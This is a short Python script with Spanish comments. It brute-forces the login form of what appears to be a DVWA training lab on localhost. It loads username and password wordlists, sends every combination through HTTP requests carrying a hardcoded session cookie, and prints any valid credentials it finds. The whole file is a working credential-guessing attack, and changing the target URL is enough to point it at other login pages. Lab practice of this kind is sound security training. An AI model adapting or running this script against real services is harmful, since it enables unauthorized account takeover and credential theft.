#!/usr/bin/env python3
import requests
import itertools
from pathlib import Path

# --- Configuración ---
BASE_URL = "http://127.0.0.1:8080/vulnerabilities/brute/"
# Sustituir por el valor real de la sesión que aparezca en tu navegador/Burp
PHPSESSID = "26etvajkjhit9dj5aenef0b065"   
SECURITY  = "low"

USERS_FILE = Path("usernames.txt")
PASS_FILE  = Path("password.txt")

# --- Funciones auxiliares ---
def load_lines(path: Path):
    """Carga líneas no vacías desde un archivo de texto."""
    return [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]

def is_success(html: str) -> bool:
    """Determina si la respuesta corresponde a un login exitoso."""
    if "Welcome to the password protected area" in html:
        return True
    if "Username and/or password incorrect." in html:
        return False
    return False

# --- Ejecución del ataque de fuerza bruta ---
def brute_force():
    users = load_lines(USERS_FILE)
    passwords = load_lines(PASS_FILE)

    session = requests.Session()
    headers = {
        "User-Agent": "Python-requests Brute/1.0",
        "Cookie": f"PHPSESSID={PHPSESSID}; security={SECURITY}"
    }

    found = []

    for user, pwd in itertools.product(users, passwords):
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }
        try:
            r = session.get(BASE_URL, params=params, headers=headers, timeout=5)
            if is_success(r.text):
                print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")
                found.append((user, pwd))
                # Si quieres detenerte en el primero, descomenta:
                # break
            else:
                print(f"[-] Intento fallido: {user}:{pwd}")
        except requests.RequestException as e:
            print(f"[!] Error en la petición con {user}:{pwd} -> {e}")

    print("\n=== Resumen ===")
    if found:
        for u, p in found:
            print(f"Válidas: {u}:{p}")
    else:
        print("No se encontraron credenciales válidas.")

if __name__ == "__main__":
    brute_force()
